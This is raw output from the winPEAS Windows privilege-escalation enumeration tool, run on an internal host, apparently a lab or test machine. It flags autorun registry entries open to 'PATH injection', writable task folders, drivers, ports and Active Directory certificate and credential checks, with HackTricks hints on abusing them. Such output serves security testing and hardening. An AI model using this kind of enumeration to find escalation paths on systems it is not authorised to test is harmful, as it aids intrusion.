    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvyu
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: wavemapper
    Folder: None (PATH Injection)
    File: msacm32.drv
   =================================================================================================


    RegPath: HKLM\Software\Classes\htmlfile\shell\open\command
    Folder: C:\Program Files\Internet Explorer
    File: C:\Program Files\Internet Explorer\iexplore.exe %1 (Unquoted and Space detected) - C:\
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _wow64cpu
    Folder: None (PATH Injection)
    File: wow64cpu.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _wowarmhw
    Folder: None (PATH Injection)
    File: wowarmhw.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _xtajit
    Folder: None (PATH Injection)
    File: xtajit.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: advapi32
    Folder: None (PATH Injection)
    File: advapi32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: clbcatq
    Folder: None (PATH Injection)
    File: clbcatq.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: combase
    Folder: None (PATH Injection)
    File: combase.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: COMDLG32
    Folder: None (PATH Injection)
    File: COMDLG32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: coml2
    Folder: None (PATH Injection)
    File: coml2.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: DifxApi
    Folder: None (PATH Injection)
    File: difxapi.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: gdi32
    Folder: None (PATH Injection)
    File: gdi32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: gdiplus
    Folder: None (PATH Injection)
    File: gdiplus.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: IMAGEHLP
    Folder: None (PATH Injection)
    File: IMAGEHLP.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: IMM32
    Folder: None (PATH Injection)
    File: IMM32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: kernel32
    Folder: None (PATH Injection)
    File: kernel32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: MSCTF
    Folder: None (PATH Injection)
    File: MSCTF.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: MSVCRT
    Folder: None (PATH Injection)
    File: MSVCRT.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: NORMALIZ
    Folder: None (PATH Injection)
    File: NORMALIZ.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: NSI
    Folder: None (PATH Injection)
    File: NSI.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: ole32
    Folder: None (PATH Injection)
    File: ole32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: OLEAUT32
    Folder: None (PATH Injection)
    File: OLEAUT32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: PSAPI
    Folder: None (PATH Injection)
    File: PSAPI.DLL
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: rpcrt4
    Folder: None (PATH Injection)
    File: rpcrt4.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: sechost
    Folder: None (PATH Injection)
    File: sechost.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: Setupapi
    Folder: None (PATH Injection)
    File: Setupapi.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: SHCORE
    Folder: None (PATH Injection)
    File: SHCORE.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: SHELL32
    Folder: None (PATH Injection)
    File: SHELL32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: SHLWAPI
    Folder: None (PATH Injection)
    File: SHLWAPI.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: user32
    Folder: None (PATH Injection)
    File: user32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: WLDAP32
    Folder: None (PATH Injection)
    File: WLDAP32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: wow64
    Folder: None (PATH Injection)
    File: wow64.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: wow64win
    Folder: None (PATH Injection)
    File: wow64win.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: WS2_32
    Folder: None (PATH Injection)
    File: WS2_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{2C7339CF-2B09-4501-B3F3-F3508C9228ED}
    Key: StubPath
    Folder: \
    FolderPerms: Users [Allow: AppendData/CreateDirectories]
    File: /UserInstall
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{6BF52A52-394A-11d3-B153-00C04F79FAA6}
    Key: StubPath
    Folder: C:\Windows\system32
    File: C:\Windows\system32\unregmp2.exe /FirstLogon
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89820200-ECBD-11cf-8B85-00AA005B4340}
    Key: StubPath
    Folder: None (PATH Injection)
    File: U
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89820200-ECBD-11cf-8B85-00AA005B4383}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\ie4uinit.exe -UserConfig
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89B4C1CD-B018-4511-B0A1-5476DBF70820}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\Rundll32.exe C:\Windows\System32\mscories.dll,Install
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{A509B1A7-37EF-4b3f-8CFC-4F3A74704073}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\rundll32.exe C:\Windows\System32\iesetup.dll,IEHardenAdmin
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{A509B1A8-37EF-4b3f-8CFC-4F3A74704073}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\rundll32.exe C:\Windows\System32\iesetup.dll,IEHardenUser
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{6BF52A52-394A-11d3-B153-00C04F79FAA6}
    Key: StubPath
    Folder: C:\Windows\system32
    File: C:\Windows\system32\unregmp2.exe /FirstLogon
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{89B4C1CD-B018-4511-B0A1-5476DBF70820}
    Key: StubPath
    Folder: C:\Windows\SysWOW64
    File: C:\Windows\SysWOW64\Rundll32.exe C:\Windows\SysWOW64\mscories.dll,Install
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{A509B1A7-37EF-4b3f-8CFC-4F3A74704073}
    Key: StubPath
    Folder: C:\Windows\SysWOW64
    File: C:\Windows\SysWOW64\rundll32.exe C:\Windows\SysWOW64\iesetup.dll,IEHardenAdmin
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{A509B1A8-37EF-4b3f-8CFC-4F3A74704073}
    Key: StubPath
    Folder: C:\Windows\SysWOW64
    File: C:\Windows\SysWOW64\rundll32.exe C:\Windows\SysWOW64\iesetup.dll,IEHardenUser
   =================================================================================================


    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
    File: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini
    Potentially sensitive file content: LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21787
   =================================================================================================


    Folder: C:\windows\tasks
    FolderPerms: Authenticated Users [Allow: WriteData/CreateFiles]
   =================================================================================================


    Folder: C:\windows\system32\tasks
    FolderPerms: Authenticated Users [Allow: WriteData/CreateFiles]
   =================================================================================================


    Folder: C:\windows
    File: C:\windows\system.ini
   =================================================================================================


    Folder: C:\windows
    File: C:\windows\win.ini
   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Scheduled Applications --Non Microsoft--
È Check if you can modify other users scheduled binaries https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.html

ÉÍÍÍÍÍÍÍÍÍÍ¹ Device Drivers --Non Microsoft--
È Check 3rd party drivers for known vulnerabilities/rootkits. https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#drivers
    QLogic Gigabit Ethernet - 7.12.31.105 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bxvbda.sys
    QLogic 10 GigE - 7.13.65.105 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\evbda.sys
    QLogic FastLinQ Ethernet - 8.33.20.103 [Cavium, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\qevbda.sys
    NVIDIA nForce(TM) RAID Driver - 10.6.0.23 [NVIDIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\nvraid.sys
    VMware vSockets Service - 9.8.19.0 build-18956547 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vsock.sys
    VMware PCI VMCI Bus Device - 9.8.18.0 build-18956547 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vmci.sys
    Intel Matrix Storage Manager driver - 8.6.2.1019 [Intel Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\iaStorV.sys
     Promiser SuperTrak EX Series -  5.1.0000.10 [Promise Technology, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\stexstor.sys
    LSI 3ware RAID Controller - WindowsBlue [LSI]: \\.\GLOBALROOT\SystemRoot\System32\drivers\3ware.sys
    AHCI 1.3 Device Driver - 1.1.3.277 [Advanced Micro Devices]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdsata.sys
    Storage Filter Driver - 1.1.3.277 [Advanced Micro Devices]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdxata.sys
    AMD Technology AHCI Compatible Controller - 3.7.1540.43 [AMD Technologies Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdsbs.sys
    Adaptec RAID Controller - 7.5.0.32048 [PMC-Sierra, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\arcsas.sys
    Windows (R) Win 7 DDK driver - 10.0.10011.16384 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ItSas35i.sys
    LSI Fusion-MPT SAS Driver (StorPort) - 1.34.03.83 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas.sys
    Windows (R) Win 7 DDK driver - 10.0.10011.16384 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas2i.sys
    Windows (R) Win 7 DDK driver - 10.0.10011.16384 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas3i.sys
    LSI SSS PCIe/Flash Driver (StorPort) - 2.10.61.81 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sss.sys
    MEGASAS RAID Controller Driver for Windows - 6.706.06.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasas.sys
    MEGASAS RAID Controller Driver for Windows - 6.714.05.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\MegaSas2i.sys
    MEGASAS RAID Controller Driver for Windows - 7.705.08.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasas35i.sys
    MegaRAID Software RAID - 15.02.2013.0129 [LSI Corporation, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasr.sys
    Marvell Flash Controller -  1.0.5.1016  [Marvell Semiconductor, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\mvumis.sys
    NVIDIA nForce(TM) SATA Driver - 10.6.0.23 [NVIDIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\nvstor.sys
    MEGASAS RAID Controller Driver for Windows - 6.805.03.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\percsas2i.sys
    MEGASAS RAID Controller Driver for Windows - 6.604.06.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\percsas3i.sys
    Microsoftr Windowsr Operating System - 2.60.01 [Silicon Integrated Systems Corp.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\SiSRaid2.sys
    Microsoftr Windowsr Operating System - 6.1.6918.0 [Silicon Integrated Systems]: \\.\GLOBALROOT\SystemRoot\System32\drivers\sisraid4.sys
    VIA RAID driver - 7.0.9600,6352 [VIA Technologies Inc.,Ltd]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vsmraid.sys
    VIA StorX RAID Controller Driver - 8.0.9200.8110 [VIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vstxraid.sys
    Chelsio Communications iSCSI Controller - 10.0.10011.16384 [Chelsio Communications]: \\.\GLOBALROOT\SystemRoot\System32\drivers\cht4sx64.sys
    Intel(R) Rapid Storage Technology driver (inbox) - 15.44.0.1010 [Intel Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\iaStorAVC.sys
    QLogic BR-series FC/FCoE HBA Stor Miniport Driver - 3.2.26.1 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bfadfcoei.sys
    Emulex WS2K12 Storport Miniport Driver x64 - 11.0.247.8000 01/26/2016 WS2K12 64 bit x64 [Emulex]: \\.\GLOBALROOT\SystemRoot\System32\drivers\elxfcoe.sys
    Emulex WS2K12 Storport Miniport Driver x64 - 11.4.225.8009 11/15/2017 WS2K12 64 bit x64 [Broadcom]: \\.\GLOBALROOT\SystemRoot\System32\drivers\elxstor.sys
    QLogic iSCSI offload driver - 8.33.5.2 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\qeois.sys
    QLogic Fibre Channel Stor Miniport Driver - 9.1.15.1 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ql2300i.sys
    QLA40XX iSCSI Host Bus Adapter - 2.1.5.0 (STOREx wx64) [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ql40xx2i.sys
    QLogic FCoE Stor Miniport Inbox Driver - 9.1.11.3 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\qlfcoei.sys
    PMC-Sierra HBA Controller - 1.3.0.10769 [PMC-Sierra]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ADP80XX.SYS
    QLogic BR-series FC/FCoE HBA Stor Miniport Driver - 3.2.26.1 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bfadi.sys
    Smart Array SAS/SATA Controller Media Driver - 8.0.4.0 Build 1 Media Driver (x86-64) [Hewlett-Packard Company]: \\.\GLOBALROOT\SystemRoot\System32\drivers\HpSAMD.sys
    VMware PVSCSI StorPort driver (64-bit) - 1.3.25.0 build-19569981 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\pvscsi.sys
    SmartRAID, SmartHBA PQI Storport Driver - 1.50.0.0 [Microsemi Corportation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\SmartSAMD.sys
    VMware Guest Introspection Driver - 12.1.0.0 build-19947491 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vsepflt.sys
    QLogic FCoE offload driver - 8.33.4.2 [Cavium, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\qefcoe.sys
    QLogic iSCSI offload driver - 7.14.7.2 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bxois.sys
    QLogic FCoE Offload driver - 7.14.15.2 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bxfcoe.sys
    VMware Raw Disk Helper Driver - 1.1.7.0 build-18933738 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vmrawdsk.sys
    VMware Guest Introspection WFP Network Filter Driver - 12.1.0.0 build-19947491 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vnetWFP.sys
    VMware Pointing PS/2 Device Driver - 12.5.12.0 build-18967789 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vmmouse.sys
    VMware SVGA 3D - 9.17.04.0001 - build-20112898 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vm3dmp_loader.sys
    VMware SVGA 3D - 9.17.04.0001 - build-20112898 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vm3dmp.sys
    VMware server memory controller - 7.5.7.0 build-18933738 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vmmemctl.sys
    Intel(R) Gigabit Adapter - 12.15.22.6 [Intel Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\e1i63x64.sys


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Network Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Network Shares
  [X] Exception: Access denied 

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerate Network Mapped Drives (WMI)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Host File

ÉÍÍÍÍÍÍÍÍÍÍ¹ Network Ifaces and known hosts
È The masks are only for the IPv4 addresses 
    Ethernet1[00:50:56:8A:F7:83]: 172.16.115.202 / 255.255.255.0
        Gateways: 172.16.115.254
        DNSs: 172.16.115.200
        Known hosts:
          172.16.115.200        00-50-56-8A-6B-EC     Dynamic
          172.16.115.206        00-50-56-8A-24-EE     Dynamic
          172.16.115.254        00-00-00-00-00-00     Invalid
          172.16.115.255        FF-FF-FF-FF-FF-FF     Static
          224.0.0.22            01-00-5E-00-00-16     Static
          224.0.0.251           01-00-5E-00-00-FB     Static
          224.0.0.252           01-00-5E-00-00-FC     Static

    Loopback Pseudo-Interface 1[]: 127.0.0.1, ::1 / 255.0.0.0
        DNSs: fec0:0:0:ffff::1%1, fec0:0:0:ffff::2%1, fec0:0:0:ffff::3%1
        Known hosts:
          224.0.0.22            00-00-00-00-00-00     Static


ÉÍÍÍÍÍÍÍÍÍÍ¹ Current TCP Listening Ports
È Check for services restricted from the outside 
  Enumerating IPv4 connections

  Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name

  TCP        0.0.0.0               135           0.0.0.0               0               Listening         876             svchost
  TCP        0.0.0.0               445           0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               5985          0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               8080          0.0.0.0               0               Listening         3944            java
  TCP        0.0.0.0               47001         0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               49664         0.0.0.0               0               Listening         500             wininit
  TCP        0.0.0.0               49665         0.0.0.0               0               Listening         1112            svchost
  TCP        0.0.0.0               49666         0.0.0.0               0               Listening         1600            svchost
  TCP        0.0.0.0               49667         0.0.0.0               0               Listening         644             lsass
  TCP        0.0.0.0               49668         0.0.0.0               0               Listening         644             lsass
  TCP        0.0.0.0               49669         0.0.0.0               0               Listening         624             services
  TCP        172.16.115.202        135           172.16.115.206        55532           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        55754           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        56912           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59485           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59520           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59521           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59522           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59523           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59524           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59525           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59526           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59527           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59529           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59530           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59531           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59532           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59533           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59534           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59535           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59536           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59561           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59597           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59598           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59599           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59600           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59601           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59602           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59603           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59604           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59606           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59607           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59608           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59609           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59610           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59611           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59613           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59614           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59696           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        61560           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        61780           Established       876             svchost
  TCP        172.16.115.202        139           0.0.0.0               0               Listening         4               System

  Enumerating IPv6 connections

  Protocol   Local Address                               Local Port    Remote Address                              Remote Port     State             Process ID      Process Name

  TCP        [::]                                        135           [::]                                        0               Listening         876             svchost
  TCP        [::]                                        445           [::]                                        0               Listening         4               System
  TCP        [::]                                        5985          [::]                                        0               Listening         4               System
  TCP        [::]                                        8080          [::]                                        0               Listening         3944            java
  TCP        [::]                                        47001         [::]                                        0               Listening         4               System
  TCP        [::]                                        49664         [::]                                        0               Listening         500             wininit
  TCP        [::]                                        49665         [::]                                        0               Listening         1112            svchost
  TCP        [::]                                        49666         [::]                                        0               Listening         1600            svchost
  TCP        [::]                                        49667         [::]                                        0               Listening         644             lsass
  TCP        [::]                                        49668         [::]                                        0               Listening         644             lsass
  TCP        [::]                                        49669         [::]                                        0               Listening         624             services
  TCP        [::1]                                       5985          [::1]                                       53232           Established       4               System
  TCP        [::1]                                       53232         [::1]                                       5985            Established       1892            C:\Windows\system32\wsmprovhost.exe

ÉÍÍÍÍÍÍÍÍÍÍ¹ Current UDP Listening Ports
È Check for services restricted from the outside 
  Enumerating IPv4 connections

  Protocol   Local Address         Local Port    Remote Address:Remote Port     Process ID        Process Name

  UDP        0.0.0.0               123           *:*                            488               svchost
  UDP        0.0.0.0               5353          *:*                            1080              svchost
  UDP        0.0.0.0               5355          *:*                            1080              svchost
  UDP        127.0.0.1             50540         *:*                            2088              svchost
  UDP        127.0.0.1             54491         *:*                            1364              svchost
  UDP        127.0.0.1             58094         *:*                            316               C:\Users\<username>\winPEASx64.exe
  UDP        127.0.0.1             63805         *:*                            644               lsass
  UDP        127.0.0.1             64764         *:*                            1324              svchost
  UDP        172.16.115.202        137           *:*                            4                 System
  UDP        172.16.115.202        138           *:*                            4                 System

  Enumerating IPv6 connections

  Protocol   Local Address                               Local Port    Remote Address:Remote Port     Process ID        Process Name

  UDP        [::]                                        123           *:*                            488               svchost

ÉÍÍÍÍÍÍÍÍÍÍ¹ Firewall Rules
È Showing only DENY rules (too many ALLOW rules always) 
    Current Profiles: DOMAIN
    FirewallEnabled (Domain):    True
    FirewallEnabled (Private):    True
    FirewallEnabled (Public):    True
    DENY rules:
  [X] Exception: Object reference not set to an instance of an object.

ÉÍÍÍÍÍÍÍÍÍÍ¹ DNS cached --limit 70--
    Entry                                 Name                                  Data
  [X] Exception: Access denied 

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Internet settings, zone and proxy configuration
  General Settings
  Hive        Key                                       Value
  HKCU        DisableCachingOfSSLPages                  0
  HKCU        IE5_UA_Backup_Flag                        5.0
  HKCU        PrivacyAdvanced                           1
  HKCU        SecureProtocols                           2688
  HKCU        User Agent                                Mozilla/4.0 (compatible; MSIE 8.0; Win32)
  HKCU        CertificateRevocation                     1
  HKCU        ZonesSecurityUpgrade                      System.Byte[]
  HKLM        ActiveXCache                              C:\Windows\Downloaded Program Files
  HKLM        CodeBaseSearchPath                        CODEBASE
  HKLM        EnablePunycode                            1
  HKLM        MinorVersion                              0
  HKLM        WarnOnIntranet                            1

  Zone Maps
  No URLs configured

  Zone Auth Settings
  No Zone Auth Settings

ÉÍÍÍÍÍÍÍÍÍÍ¹ Internet Connectivity
È Checking if internet access is possible via different methods 
    HTTP (80) Access: Not Accessible
  [X] Exception:       Error: A task was canceled.
    HTTPS (443) Access: Not Accessible
  [X] Exception:       Error: TCP connect timed out
    HTTPS (443) Access by Domain Name: Not Accessible
  [X] Exception:       Error: A task was canceled.
    DNS (53) Access: Not Accessible
  [X] Exception:       Error: A connection attempt failed because the connected party did not properly respond after a period of time, or established connection failed because connected host has failed to respond
    ICMP (ping) Access: Not Accessible
  [X] Exception:       Error: Ping failed: TimedOut

ÉÍÍÍÍÍÍÍÍÍÍ¹ Hostname Resolution
È Checking if the hostname can be resolved externally 
  [X] Exception:     Error during hostname check: An error occurred while sending the request.


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Active Directory Quick Checks ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ gMSA readable managed passwords
È Look for Group Managed Service Accounts you can read (msDS-ManagedPassword) https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/gmsa.html
  [X] Exception: An operations error occurred.


ÉÍÍÍÍÍÍÍÍÍÍ¹ AD CS misconfigurations for ESC
È  https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates.html
È Check for ADCS misconfigurations in the local DC registry
  [-] Host is not a domain controller. Skipping ADCS Registry check
È 
If you can modify a template (WriteDacl/WriteOwner/GenericAll), you can abuse ESC4
  [X] Exception: An operations error occurred.



ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Cloud Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
Learn and practice cloud hacking in training.hacktricks.xyz
AWS EC2?                                No   
Azure VM?                               No   
Azure Tokens?                           No   
Google Cloud Platform?                  No   
Google Workspace Joined?                No   
Google Cloud Directory Sync?            No   
Google Password Sync?                   No   


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Windows Credentials ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking Windows Vault
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#credentials-manager--windows-vault
  [ERROR] Unable to enumerate vaults. Error (0x1061)
    Not Found

